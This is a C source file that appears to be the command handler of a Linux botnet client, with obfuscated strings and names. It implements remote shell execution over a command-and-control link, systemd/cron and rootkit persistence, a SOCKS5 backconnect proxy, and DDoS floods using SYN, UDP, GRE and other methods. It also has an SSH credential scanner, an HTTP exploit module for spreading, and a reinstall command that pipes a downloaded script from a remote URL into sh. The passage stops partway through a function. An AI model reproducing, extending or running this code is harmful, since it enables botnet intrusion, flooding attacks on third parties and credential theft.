/* ==========================================================================
 *  commands.c -- Command dispatcher and shell execution
 *  Pure C port of commands.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"
#ifndef NO_ATTACK
#include "attack.h"
#endif

/* ==========================================================================
 * SHELL EXECUTION (matches Go Kc5Lw2k -- blocking exec)
 * ========================================================================== */

dstr Kc5Lw2k(const char *cmd) {
    dstr output;
    FILE *fp;
    char buf[4096];
    int status;

    DS4RR2W();

    /* popen() already invokes sh -c, so pass cmd directly — no double-wrap */
    ds_init(&output);
    fp = popen(cmd, _S(1,0xde));
    if (!fp) {
        ds_set(&output, _S(19,0xe9,0xde,0xde,0xc3,0xde,0x96,0x8c,0xdc,0xc3,0xdc,0xc9,0xc2,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
        return output;
    }

    while (fgets(buf, sizeof(buf), fp)) {
        ds_cat(&output, buf);
    }

    status = pclose(fp);
    if (status != 0 && ds_empty(&output)) {
        char errbuf[64];
        snprintf(errbuf, sizeof(errbuf), _S(19,0xe9,0xde,0xde,0xc3,0xde,0x96,0x8c,0xc9,0xd4,0xc5,0xd8,0x8c,0xcf,0xc3,0xc8,0xc9,0x8c,0x89,0xc8), WEXITSTATUS(status));
        ds_set(&output, errbuf);
    }
    return output;
}

/* ==========================================================================
 * DETACHED EXEC (matches Go oceanLotus -- fire-and-forget)
 * ========================================================================== */

void YS5EH8a(const char *cmd) {
    pid_t pid;
    int null_fd;

    DS4RR2W();
    pid = fork();
    if (pid == 0) {
        /* Child */
        setsid();
        null_fd = open(_S(9,0x83,0xc8,0xc9,0xda,0x83,0xc2,0xd9,0xc0,0xc0), O_RDWR);
        if (null_fd >= 0) {
            dup2(null_fd, STDIN_FILENO);
            dup2(null_fd, STDOUT_FILENO);
            dup2(null_fd, STDERR_FILENO);
            if (null_fd > 2) close(null_fd);
        }
        execl(ds_cstr(&_jy7Ho4s), ds_cstr(&_jy7Ho4s),
              ds_cstr(&_oD3KN5M), cmd, (char *)NULL);
        _exit(1);
    }
    /* Parent: don't wait */
}

/* ==========================================================================
 * STREAMING EXEC (matches Go bn5GN4t -- real-time output over C2)
 * ========================================================================== */

/* Thread context for pipe reader threads */
typedef struct {
    int      fd;
    _EA8up4M  *conn;
    const char *fmt; /* pointer to ds_cstr of the format global */
} _Qa5oq7N;

static void *Aj7dy5u(void *arg) {
    _Qa5oq7N *ctx = (_Qa5oq7N *)arg;
    FILE *f;
    char line[4096];
    char sendbuf[4200];

    f = fdopen(ctx->fd, _S(1,0xde));
    if (!f) {
        close(ctx->fd);
        free(ctx);
        return NULL;
    }
    while (fgets(line, sizeof(line), f)) {
        snprintf(sendbuf, sizeof(sendbuf), ctx->fmt, line);
        Ng2ZR5y(ctx->conn, sendbuf);
    }
    fclose(f); /* also closes ctx->fd */
    free(ctx);
    return NULL;
}

void bn5GN4t(const char *cmd, _EA8up4M *c) {
    int stdout_pipe[2], stderr_pipe[2];
    pid_t pid;
    pthread_t stdout_tid, stderr_tid;
    _Qa5oq7N *out_ctx, *err_ctx;
    int status;

    DS4RR2W();

    if (pipe(stdout_pipe) < 0) return;
    if (pipe(stderr_pipe) < 0) {
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        return;
    }

    pid = fork();
    if (pid < 0) {
        close(stdout_pipe[0]); close(stdout_pipe[1]);
        close(stderr_pipe[0]); close(stderr_pipe[1]);
        return;
    }

    if (pid == 0) {
        /* Child */
        close(stdout_pipe[0]);
        close(stderr_pipe[0]);
        dup2(stdout_pipe[1], STDOUT_FILENO);
        dup2(stderr_pipe[1], STDERR_FILENO);
        close(stdout_pipe[1]);
        close(stderr_pipe[1]);
        execl(ds_cstr(&_jy7Ho4s), ds_cstr(&_jy7Ho4s),
              ds_cstr(&_oD3KN5M), cmd, (char *)NULL);
        _exit(1);
    }

    /* Parent */
    close(stdout_pipe[1]);
    close(stderr_pipe[1]);

    out_ctx = (_Qa5oq7N *)malloc(sizeof(_Qa5oq7N));
    out_ctx->fd   = stdout_pipe[0];
    out_ctx->conn = c;
    out_ctx->fmt  = ds_cstr(&_Ag2PA3Y);
    pthread_create(&stdout_tid, NULL, Aj7dy5u, out_ctx);

    err_ctx = (_Qa5oq7N *)malloc(sizeof(_Qa5oq7N));
    err_ctx->fd   = stderr_pipe[0];
    err_ctx->conn = c;
    err_ctx->fmt  = ds_cstr(&_sq2vi4d);
    pthread_create(&stderr_tid, NULL, Aj7dy5u, err_ctx);

    status = 0;
    waitpid(pid, &status, 0);
    pthread_join(stdout_tid, NULL);
    pthread_join(stderr_tid, NULL);

    if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
        char buf[256];
        char codebuf[32];
        snprintf(codebuf, sizeof(codebuf), _S(12,0xc9,0xd4,0xc5,0xd8,0x8c,0xcf,0xc3,0xc8,0xc9,0x8c,0x89,0xc8), WEXITSTATUS(status));
        snprintf(buf, sizeof(buf), ds_cstr(&_yh8Vu8D), codebuf);
        Ng2ZR5y(c, buf);
    } else {
        Ng2ZR5y(c, ds_cstr(&_VD7BQ4c));
    }
}

/* ==========================================================================
 * MACHETE THREAD WRAPPER (for detached streaming)
 * ========================================================================== */

typedef struct {
    char   *cmd;
    _EA8up4M *conn;
} machete_ctx_t;

static void *Kj7VJ5r(void *arg) {
    machete_ctx_t *ctx = (machete_ctx_t *)arg;
    bn5GN4t(ctx->cmd, ctx->conn);
    free(ctx->cmd);
    free(ctx);
    return NULL;
}

/* ==========================================================================
 * DRAGONFLY THREAD WRAPPER (for detached persist)
 * ========================================================================== */

static void *Ba7RE7V(void *arg) {
    (void)arg;
    Zp8bU5j();
    return NULL;
}

/* ==========================================================================
 * HELPER: _Ps6Dz6i a command string into a strarr
 * ========================================================================== */

static void _Ps6Dz6i(const char *command, strarr *fields) {
    const char *p = command;
    sa_init(fields);
    while (*p) {
        const char *start;
        dstr tok;
        /* skip whitespace */
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;
        start = p;
        while (*p && *p != ' ' && *p != '\t') p++;
        ds_init(&tok);
        ds_setn(&tok, start, (size_t)(p - start));
        sa_pushds(fields, &tok);
        ds_free(&tok);
    }
}

/* Helper: find start of args after first token */
static const char *find_args(const char *command, const char *first_arg) {
    const char *p = strstr(command, first_arg);
    return p ? p : "";
}

/* Helper: check if string is all digits */
static int _HS3Vk8U(const char *s) {
    if (!s || !*s) return 0;
    while (*s) {
        if (*s < '0' || *s > '9') return 0;
        s++;
    }
    return 1;
}

/* ==========================================================================
 * COMMAND DISPATCHER (matches Go blackEnergy)
 * ========================================================================== */

int CS6Ko7t(_EA8up4M *c, const char *command) {
    strarr fields;
    const char *cmd_str;
    int result = -1;

    DS4RR2W();
    Ng4eX6x();

    _Ps6Dz6i(command, &fields);
    if (sa_count(&fields) == 0) { sa_free(&fields); return -1; }

    cmd_str = sa_get(&fields, 0);

    /* !shell / !exec -- blocking shell command */
    if (strcmp(cmd_str, _S(6,0x8d,0xdf,0xc4,0xc9,0xc0,0xc0)) == 0 || strcmp(cmd_str, _S(5,0x8d,0xc9,0xd4,0xc9,0xcf)) == 0) {
        const char *args;
        dstr output, encoded, msg;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args = find_args(command, sa_get(&fields, 1));
        output = Kc5Lw2k(args);
        encoded = _uA7kc2G((const uint8_t *)ds_cstr(&output), ds_len(&output));
        ds_free(&output);

        ds_init(&msg);
        {
            size_t needed = ds_len(&encoded) + ds_len(&_nE6py4K) + 16;
            char *buf = (char *)malloc(needed);
            snprintf(buf, needed, ds_cstr(&_nE6py4K), ds_cstr(&encoded));
            ds_set(&msg, buf);
            free(buf);
        }
        ds_free(&encoded);
        Ng2ZR5y(c, ds_cstr(&msg));
        ds_free(&msg);
        result = 0;
        goto done;
    }

    /* !stream -- streaming output */
    if (strcmp(cmd_str, _S(7,0x8d,0xdf,0xd8,0xde,0xc9,0xcd,0xc1)) == 0) {
        const char *args;
        machete_ctx_t *ctx;
        pthread_t tid;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args = find_args(command, sa_get(&fields, 1));
        ctx = (machete_ctx_t *)malloc(sizeof(machete_ctx_t));
        if (!ctx) { sa_free(&fields); return -1; }
        ctx->cmd  = (char *)malloc(strlen(args) + 1);
        if (!ctx->cmd) { free(ctx); sa_free(&fields); return -1; }
        memcpy(ctx->cmd, args, strlen(args) + 1);
        ctx->conn = c;
        pthread_create(&tid, NULL, Kj7VJ5r, ctx);
        pthread_detach(tid);
        Ng2ZR5y(c, ds_cstr(&_KZ7LL3b));
        result = 0;
        goto done;
    }

    /* !detach / !bg -- background exec */
    if (strcmp(cmd_str, _S(7,0x8d,0xc8,0xc9,0xd8,0xcd,0xcf,0xc4)) == 0 || strcmp(cmd_str, _S(3,0x8d,0xce,0xcb)) == 0) {
        const char *args;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args = find_args(command, sa_get(&fields, 1));
        YS5EH8a(args);
        Ng2ZR5y(c, ds_cstr(&_Vm7uC8w));
        result = 0;
        goto done;
    }

    /* !persist -- comprehensive persistence */
    if (strcmp(cmd_str, _S(8,0x8d,0xdc,0xc9,0xde,0xdf,0xc5,0xdf,0xd8)) == 0) {
        /* Check for subcommands */
        const char *sub = (sa_count(&fields) >= 2) ? sa_get(&fields, 1) : "";
        if (strcmp(sub, _S(7,0xde,0xc3,0xc3,0xd8,0xc7,0xc5,0xd8)) == 0) {
            const char *b64 = (sa_count(&fields) >= 3) ? find_args(command, sa_get(&fields, 2)) : "";
            vF6ku2D(b64);
            Ng2ZR5y(c, _S(39,0xf7,0xde,0xc3,0xc3,0xd8,0xc7,0xc5,0xd8,0xf1,0x8c,0xe0,0xe8,0xf3,0xfc,0xfe,0xe9,0xe0,0xe3,0xed,0xe8,0x8c,0xde,0xc3,0xc3,0xd8,0xc7,0xc5,0xd8,0x8c,0xc5,0xc2,0xdf,0xd8,0xcd,0xc0,0xc0,0xc9,0xc8,0xa6));
            result = 0;
            goto done;
        } else if (strcmp(sub, _S(9,0xd9,0xc2,0xde,0xc3,0xc3,0xd8,0xc7,0xc5,0xd8)) == 0) {
            uB5TJ8d();
            Ng2ZR5y(c, _S(26,0xf7,0xde,0xc3,0xc3,0xd8,0xc7,0xc5,0xd8,0xf1,0x8c,0xfe,0xc3,0xc3,0xd8,0xc7,0xc5,0xd8,0x8c,0xde,0xc9,0xc1,0xc3,0xda,0xc9,0xc8,0xa6));
            result = 0;
            goto done;
        }
        /* Default: standard persistence (systemd/cron) */
        {
            pthread_t tid;
            pthread_create(&tid, NULL, Ba7RE7V, NULL);
            pthread_detach(tid);
            Ng2ZR5y(c, ds_cstr(&_HH8Az2g));
        }
        result = 0;
        goto done;
    }

    /* !kill -- self-destruct */
    if (strcmp(cmd_str, _S(5,0x8d,0xc7,0xc5,0xc0,0xc0)) == 0) {
        Ng2ZR5y(c, ds_cstr(&_hb6Aa4L));
        sa_free(&fields);
        DB2Ve6Z();
        return 0; /* unreachable */
    }

    /* !exit -- lightweight process exit (no nuke, persistence stays intact).
     * Used by CNC to kick a stale session so a new instance can take over. */
    if (strcmp(cmd_str, _S(5,0x8d,0xc9,0xd4,0xc5,0xd8)) == 0) {
        _nS5PJ8Y(_S(47,0x8d,0xc9,0xd4,0xc5,0xd8,0x8c,0xde,0xc9,0xcf,0xc9,0xc5,0xda,0xc9,0xc8,0x8c,0xca,0xde,0xc3,0xc1,0x8c,0xef,0xe2,0xef,0x80,0x8c,0xdf,0xc4,0xd9,0xd8,0xd8,0xc5,0xc2,0xcb,0x8c,0xc8,0xc3,0xdb,0xc2,0x8c,0x84,0xfc,0xe5,0xe8,0x8c,0x89,0xc8,0x85), (int)getpid());
        sa_free(&fields);
        _exit(0);
        return 0; /* unreachable */
    }

    /* !info -- system information */
    if (strcmp(cmd_str, _S(5,0x8d,0xc5,0xc2,0xca,0xc3)) == 0) {
        char hostname[256];
        dstr arch, id;
        char info[1024];
        char sendbuf[1200];

        memset(hostname, 0, sizeof(hostname));
        gethostname(hostname, sizeof(hostname) - 1);
        Xy5oR2j(&arch);
        Ai2mW7K(&id);

        snprintf(info, sizeof(info),
                 _S(42,0xe4,0xc3,0xdf,0xd8,0xc2,0xcd,0xc1,0xc9,0x96,0x8c,0x89,0xdf,0xa6,0xed,0xde,0xcf,0xc4,0x96,0x8c,0x89,0xdf,0xa6,0xee,0xc3,0xd8,0xe5,0xe8,0x96,0x8c,0x89,0xdf,0xa6,0xe3,0xff,0x96,0x8c,0xe0,0xc5,0xc2,0xd9,0xd4,0xa6),
                 hostname, ds_cstr(&arch), ds_cstr(&id));
        snprintf(sendbuf, sizeof(sendbuf), ds_cstr(&_mi6YG6d), info);
        Ng2ZR5y(c, sendbuf);

        ds_free(&arch);
        ds_free(&id);
        result = 0;
        goto done;
    }

    /* !socks -- SOCKS5 proxy (direct or relay backconnect) */
    if (strcmp(cmd_str, _S(6,0x8d,0xdf,0xc3,0xcf,0xc7,0xdf)) == 0) {
        if (sa_count(&fields) >= 2) {
            const char *arg = sa_get(&fields, 1);
            if (strchr(arg, ':') != NULL) {
                /* Relay mode: arg is host:port */
                dstr rhost, rport;
                ds_init(&rhost);
                ds_init(&rport);
                if (gv4Kv3u(arg, &rhost, &rport)) {
                    int err = MA2zo8a(ds_cstr(&rhost), ds_cstr(&rport), c);
                    if (err < 0) {
                        char buf[256];
                        snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(20,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xcf,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
                        Ng2ZR5y(c, buf);
                    } else {
                        char buf[256];
                        snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), arg);
                        Ng2ZR5y(c, buf);
                    }
                } else {
                    char buf[256];
                    snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(21,0xc5,0xc2,0xda,0xcd,0xc0,0xc5,0xc8,0x8c,0xde,0xc9,0xc0,0xcd,0xd5,0x8c,0xcd,0xc8,0xc8,0xde,0xc9,0xdf,0xdf));
                    Ng2ZR5y(c, buf);
                }
                ds_free(&rhost);
                ds_free(&rport);
            } else {
                /* Direct mode: arg is port number */
                int err = jw8CH7B(arg, c);
                if (err != 0) {
                    char buf[256];
                    snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(11,0xce,0xc5,0xc2,0xc8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
                    Ng2ZR5y(c, buf);
                } else {
                    char buf[256];
                    char addr[64];
                    snprintf(addr, sizeof(addr), _S(10,0x9c,0x82,0x9c,0x82,0x9c,0x82,0x9c,0x96,0x89,0xdf), arg);
                    snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), addr);
                    Ng2ZR5y(c, buf);
                }
            }
            result = 0;
            goto done;
        } else {
            /* Default port 1080 */
            int err = jw8CH7B(_S(4,0x9d,0x9c,0x94,0x9c), c);
            if (err != 0) {
                char buf[256];
                snprintf(buf, sizeof(buf), ds_cstr(&_zR8oC6c), _S(11,0xce,0xc5,0xc2,0xc8,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8));
                Ng2ZR5y(c, buf);
            } else {
                char buf[256];
                snprintf(buf, sizeof(buf), ds_cstr(&_hD4fS7K), _S(12,0x9c,0x82,0x9c,0x82,0x9c,0x82,0x9c,0x96,0x9d,0x9c,0x94,0x9c));
                Ng2ZR5y(c, buf);
            }
            result = 0;
            goto done;
        }
    }

#ifndef NO_ATTACK
    /* !attack -- launch flood attack
     * Format: !attack <method> <target_ip> <port> <duration> [key=val ...]
     * Example: !attack syn 1.2.3.4 80 30 size=512
     */
    if (strcmp(cmd_str, _S(7,0x8d,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7)) == 0) {
        const struct { const char *name; uint8_t id; } methods[] = {
            {_S(3,0xd9,0xc8,0xdc),        ATK_VEC_UDP},
            {_S(3,0xda,0xdf,0xc9),        ATK_VEC_VSE},
            {_S(3,0xc8,0xc2,0xdf),        ATK_VEC_DNS},
            {_S(3,0xdf,0xd5,0xc2),        ATK_VEC_SYN},
            {_S(3,0xcd,0xcf,0xc7),        ATK_VEC_ACK},
            {_S(5,0xdf,0xd8,0xc3,0xc1,0xdc),      ATK_VEC_STOMP},
            {_S(5,0xcb,0xde,0xc9,0xc5,0xdc),      ATK_VEC_GREIP},
            {_S(6,0xcb,0xde,0xc9,0xc9,0xd8,0xc4),     ATK_VEC_GREETH},
            {_S(8,0xd9,0xc8,0xdc,0xdc,0xc0,0xcd,0xc5,0xc2),   ATK_VEC_UDP_PLAIN},
            {_S(3,0xdf,0xd8,0xc8),        ATK_VEC_STD},
            {_S(4,0xd4,0xc1,0xcd,0xdf),       ATK_VEC_XMAS},
            {_S(4,0xd9,0xdf,0xd5,0xc2),       ATK_VEC_USYN},
            {_S(6,0xd8,0xcf,0xdc,0xcd,0xc0,0xc0),     ATK_VEC_TCPALL},
            {_S(7,0xd8,0xcf,0xdc,0xca,0xde,0xcd,0xcb),    ATK_VEC_TCPFRAG},
            {_S(3,0xc3,0xda,0xc4),        ATK_VEC_OVH},
            {_S(4,0xcd,0xdf,0xd5,0xc2),       ATK_VEC_ASYN},
            {NULL, 0}
        };
        const struct { const char *key; uint8_t opt_id; } opt_map[] = {
            {_S(4,0xdf,0xc5,0xd6,0xc9),    ATK_OPT_PAYLOAD_SIZE}, {_S(4,0xde,0xcd,0xc2,0xc8),   ATK_OPT_PAYLOAD_RAND},
            {_S(3,0xd8,0xc3,0xdf),     ATK_OPT_IP_TOS},      {_S(5,0xc5,0xc8,0xc9,0xc2,0xd8),  ATK_OPT_IP_IDENT},
            {_S(3,0xd8,0xd8,0xc0),     ATK_OPT_IP_TTL},       {_S(2,0xc8,0xca),     ATK_OPT_IP_DF},
            {_S(5,0xdf,0xdc,0xc3,0xde,0xd8),   ATK_OPT_SPORT},        {_S(5,0xc8,0xdc,0xc3,0xde,0xd8),  ATK_OPT_DPORT},
            {_S(3,0xd9,0xde,0xcb),     ATK_OPT_URG},          {_S(3,0xcd,0xcf,0xc7),    ATK_OPT_ACK},
            {_S(3,0xdc,0xdf,0xc4),     ATK_OPT_PSH},          {_S(3,0xde,0xdf,0xd8),    ATK_OPT_RST},
            {_S(3,0xdf,0xd5,0xc2),     ATK_OPT_SYN},          {_S(3,0xca,0xc5,0xc2),    ATK_OPT_FIN},
            {_S(6,0xdf,0xc9,0xdd,0xde,0xc2,0xc8),  ATK_OPT_SEQRND},      {_S(6,0xcd,0xcf,0xc7,0xde,0xc2,0xc8), ATK_OPT_ACKRND},
            {_S(4,0xcb,0xcf,0xc5,0xdc),    ATK_OPT_GRE_CONSTIP},  {_S(6,0xdf,0xc3,0xd9,0xde,0xcf,0xc9), ATK_OPT_SOURCE},
            {_S(6,0xc8,0xc3,0xc1,0xcd,0xc5,0xc2),  ATK_OPT_DOMAIN},
            {NULL, 0}
        };
        uint8_t method_id = 0xff;
        uint32_t target_ip, duration;
        uint16_t port;
        char sendbuf[256];
        int i;

        if (sa_count(&fields) < 5) {
            Ng2ZR5y(c, _S(57,0xf9,0xdf,0xcd,0xcb,0xc9,0x96,0x8c,0x8d,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7,0x8c,0x90,0xc1,0xc9,0xd8,0xc4,0xc3,0xc8,0x92,0x8c,0x90,0xc5,0xdc,0x92,0x8c,0x90,0xdc,0xc3,0xde,0xd8,0x92,0x8c,0x90,0xc8,0xd9,0xde,0xcd,0xd8,0xc5,0xc3,0xc2,0x92,0x8c,0xf7,0xc3,0xdc,0xd8,0xdf,0x82,0x82,0x82,0xf1,0xa6));
            result = -1;
            goto done;
        }

        for (i = 0; methods[i].name; i++) {
            if (strcmp(sa_get(&fields, 1), methods[i].name) == 0) {
                method_id = methods[i].id;
                break;
            }
        }
        if (method_id == 0xff) {
            snprintf(sendbuf, sizeof(sendbuf), _S(19,0xf9,0xc2,0xc7,0xc2,0xc3,0xdb,0xc2,0x8c,0xc1,0xc9,0xd8,0xc4,0xc3,0xc8,0x96,0x8c,0x89,0xdf,0xa6), sa_get(&fields, 1));
            Ng2ZR5y(c, sendbuf);
            result = -1;
            goto done;
        }

        target_ip = inet_addr(sa_get(&fields, 2));
        port = (uint16_t)atoi(sa_get(&fields, 3));
        duration = (uint32_t)atoi(sa_get(&fields, 4));

        if (target_ip == INADDR_NONE || duration == 0) {
            Ng2ZR5y(c, _S(30,0xe5,0xc2,0xda,0xcd,0xc0,0xc5,0xc8,0x8c,0xd8,0xcd,0xde,0xcb,0xc9,0xd8,0x8c,0xe5,0xfc,0x8c,0xc3,0xde,0x8c,0xc8,0xd9,0xde,0xcd,0xd8,0xc5,0xc3,0xc2,0xa6));
            result = -1;
            goto done;
        }

        /* Build binary buffer for dz4NW6v:
         * [uint32 duration BE][uint8 vector][uint8 num_targets]
         * [uint32 ip][uint8 netmask]
         * [uint8 num_opts]([uint8 opt_key][uint8 val_len][val bytes])...
         */
        {
            char buf[2048];
            int pos = 0;
            int num_opts = 0;
            int opts_start;
            int fi;

            *(uint32_t *)(buf + pos) = htonl(duration);
            pos += 4;
            buf[pos++] = (char)method_id;
            buf[pos++] = 1; /* num_targets */
            *(uint32_t *)(buf + pos) = target_ip;
            pos += 4;
            buf[pos++] = 32; /* netmask /32 */

            opts_start = pos;
            pos++; /* placeholder for num_opts */

            if (port != 0) {
                char portstr[8];
                int plen;
                snprintf(portstr, sizeof(portstr), _S(2,0x89,0xc8), port);
                plen = (int)strlen(portstr);
                buf[pos++] = ATK_OPT_DPORT;
                buf[pos++] = (char)plen;
                memcpy(buf + pos, portstr, plen);
                pos += plen;
                num_opts++;
            }

            for (fi = 5; fi < (int)sa_count(&fields); fi++) {
                const char *arg = sa_get(&fields, fi);
                const char *eq = strchr(arg, '=');
                if (!eq) continue;
                {
                    char key[32];
                    const char *val;
                    int vlen, oi;
                    int keylen = (int)(eq - arg);
                    if (keylen >= (int)sizeof(key)) continue;
                    memcpy(key, arg, keylen);
                    key[keylen] = '\0';
                    val = eq + 1;
                    vlen = (int)strlen(val);
                    if (vlen > 255 || vlen == 0) continue;

                    for (oi = 0; opt_map[oi].key; oi++) {
                        if (strcmp(key, opt_map[oi].key) == 0) {
                            buf[pos++] = opt_map[oi].opt_id;
                            buf[pos++] = (char)vlen;
                            memcpy(buf + pos, val, vlen);
                            pos += vlen;
                            num_opts++;
                            break;
                        }
                    }
                }
            }

            buf[opts_start] = (char)num_opts;

            dz4NW6v(buf, pos);

            snprintf(sendbuf, sizeof(sendbuf),
                     _S(37,0xf7,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7,0xf1,0x8c,0x89,0xdf,0x8c,0x81,0x92,0x8c,0x89,0xdf,0x96,0x89,0xc8,0x8c,0xca,0xc3,0xde,0x8c,0x89,0xc8,0xdf,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6),
                     sa_get(&fields, 1), sa_get(&fields, 2), port, duration);
            Ng2ZR5y(c, sendbuf);
        }
        result = 0;
        goto done;
    }

    /* !stopattack -- kill all running floods */
    if (strcmp(cmd_str, _S(11,0x8d,0xdf,0xd8,0xc3,0xdc,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7)) == 0) {
        UV8wo4a();
        Ng2ZR5y(c, _S(28,0xf7,0xcd,0xd8,0xd8,0xcd,0xcf,0xc7,0xf1,0x8c,0xcd,0xc0,0xc0,0x8c,0xca,0xc0,0xc3,0xc3,0xc8,0xdf,0x8c,0xdf,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6));
        result = 0;
        goto done;
    }
#endif /* NO_ATTACK */

    /* !reinstall <url> -- force-replace: remove lock + binary, fire loader, exit.
     * The loader sees no running instance and downloads a fresh binary. */
    if (strcmp(cmd_str, _S(10,0x8d,0xde,0xc9,0xc5,0xc2,0xdf,0xd8,0xcd,0xc0,0xc0)) == 0) {
        const char *url;
        char cmd_buf[1024];
        if (sa_count(&fields) < 2) {
            Ng2ZR5y(c, _S(24,0xf7,0xde,0xc9,0xc5,0xc2,0xdf,0xd8,0xcd,0xc0,0xc0,0xf1,0x8c,0xc1,0xc5,0xdf,0xdf,0xc5,0xc2,0xcb,0x8c,0xf9,0xfe,0xe0,0xa6));
            result = -1;
            goto done;
        }
        url = sa_get(&fields, 1);

        Ng2ZR5y(c, _S(60,0xf7,0xde,0xc9,0xc5,0xc2,0xdf,0xd8,0xcd,0xc0,0xc0,0xf1,0x8c,0xde,0xc9,0xdc,0xc0,0xcd,0xcf,0xc5,0xc2,0xcb,0x8c,0xb8,0x8c,0xc7,0xc5,0xc0,0xc0,0xc5,0xc2,0xcb,0x8c,0xdf,0xc9,0xc0,0xca,0x80,0x8c,0xca,0xc9,0xd8,0xcf,0xc4,0xc5,0xc2,0xcb,0x8c,0xca,0xde,0xc9,0xdf,0xc4,0x8c,0xce,0xc5,0xc2,0xcd,0xde,0xd5,0xa6));

        /* Remove cached binary so the loader re-downloads */
        {
            dstr bin_path;
            Ri2bh5v();
            ds_init(&bin_path);
            ds_catds(&bin_path, &_UW4jD7J);
            ds_cat(&bin_path, _S(1,0x83));
            ds_catds(&bin_path, &_Cs5Qb7D);
            unlink(ds_cstr(&bin_path));
            ds_free(&bin_path);
        }

        /* Sanitise URL: strip single quotes so they can't break the sh quoting */
        {
            char safe_url[1024];
            size_t si = 0, di = 0;
            while (url[si] && di < sizeof(safe_url) - 1) {
                if (url[si] != '\'') safe_url[di++] = url[si];
                si++;
            }
            safe_url[di] = '\0';

            snprintf(cmd_buf, sizeof(cmd_buf),
                     _S(45,0x84,0xdb,0xcb,0xc9,0xd8,0x8c,0x81,0xdd,0xe3,0x81,0x8c,0x8b,0x89,0xdf,0x8b,0x8c,0xd0,0x8c,0xdf,0xc4,0x8c,0xd0,0xd0,0x8c,0xcf,0xd9,0xde,0xc0,0x8c,0x81,0xdf,0xe0,0x8c,0x8b,0x89,0xdf,0x8b,0x8c,0xd0,0x8c,0xdf,0xc4,0x85,0x8c,0x8a),
                     safe_url, safe_url);
        }
        YS5EH8a(cmd_buf);

        /* Give the background fetch a moment to fork, then die */
        usleep(200000);
        _exit(0);
    }

    /* !stopsocks -- stop proxy */
    if (strcmp(cmd_str, _S(10,0x8d,0xdf,0xd8,0xc3,0xdc,0xdf,0xc3,0xcf,0xc7,0xdf)) == 0) {
        tV4Lm4J();
        Ng2ZR5y(c, ds_cstr(&_cJ8BU8L));
        result = 0;
        goto done;
    }

#ifndef NO_SELFREP
    /* !ssh <base64 payload> -- start SSH credential scanner */
    if (strcmp(cmd_str, _S(4,0x8d,0xdf,0xdf,0xc4)) == 0) {
        const char *args_ssh;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args_ssh = find_args(command, sa_get(&fields, 1));
        if (_bj8XN2t > 0) {
            Ng2ZR5y(c, _S(22,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xed,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        } else {
            kh8hL4N(args_ssh, c);
            Ng2ZR5y(c, _S(22,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xff,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6));
        }
        result = 0;
        goto done;
    }

    /* !stopssh -- stop SSH scanner */
    if (strcmp(cmd_str, _S(8,0x8d,0xdf,0xd8,0xc3,0xdc,0xdf,0xdf,0xc4)) == 0) {
        if (_bj8XN2t > 0) {
            Ss3vb6a();
            Ng2ZR5y(c, _S(22,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xff,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xdf,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6));
        } else {
            Ng2ZR5y(c, _S(26,0xf7,0xdf,0xdf,0xc4,0xf1,0x8c,0xff,0xcf,0xcd,0xc2,0xc2,0xc9,0xde,0x8c,0xc2,0xc3,0xd8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        }
        result = 0;
        goto done;
    }

    /* !http <base64 payload> — HTTP exploit module */
    if (strcmp(cmd_str, _S(5,0x8d,0xc4,0xd8,0xd8,0xdc)) == 0) {
        const char *args_http;
        if (sa_count(&fields) < 2) { sa_free(&fields); return -1; }
        args_http = find_args(command, sa_get(&fields, 1));
        if (_AR2yQ6h > 0) {
            Ng2ZR5y(c, _S(23,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xed,0xc0,0xde,0xc9,0xcd,0xc8,0xd5,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0xa6));
        } else {
            St3TW4o(args_http);
            Ng2ZR5y(c, _S(30,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xe9,0xd4,0xdc,0xc0,0xc3,0xc5,0xd8,0x8c,0xc1,0xc3,0xc8,0xd9,0xc0,0xc9,0x8c,0xdf,0xd8,0xcd,0xde,0xd8,0xc9,0xc8,0xa6));
        }
        result = 0;
        goto done;
    }

    if (strcmp(cmd_str, _S(9,0x8d,0xdf,0xd8,0xc3,0xdc,0xc4,0xd8,0xd8,0xdc)) == 0) {
        if (_AR2yQ6h > 0) { Gc5wq8T(); Ng2ZR5y(c, _S(15,0xf7,0xc4,0xd8,0xd8,0xdc,0xf1,0x8c,0xff,0xd8,0xc3,0xdc,0xdc,0xc9,0xc8,0xa6)); }
